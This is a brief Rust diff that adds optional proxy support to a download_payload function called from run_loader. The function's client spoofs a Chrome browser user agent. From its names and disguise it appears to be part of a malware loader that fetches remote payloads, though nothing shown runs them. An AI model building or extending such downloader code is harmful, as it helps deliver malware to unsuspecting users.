@@ -28,9 +28,16 @@ pub async fn run_loader() {
 }
 
 async fn download_payload(url: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
-    let client = reqwest::Client::builder()
-        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
-        .build()?;
+    let mut builder = reqwest::Client::builder()
+        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
+
+    if let Some(proxy_url) = &RecoveryControl::global().proxy_server {
+        if let Ok(proxy) = reqwest::Proxy::all(proxy_url) {
+            builder = builder.proxy(proxy);
+        }
+    }
+
+    let client = builder.build()?;
 
     let response = client.get(url).send().await?;
     if !response.status().is_success() {
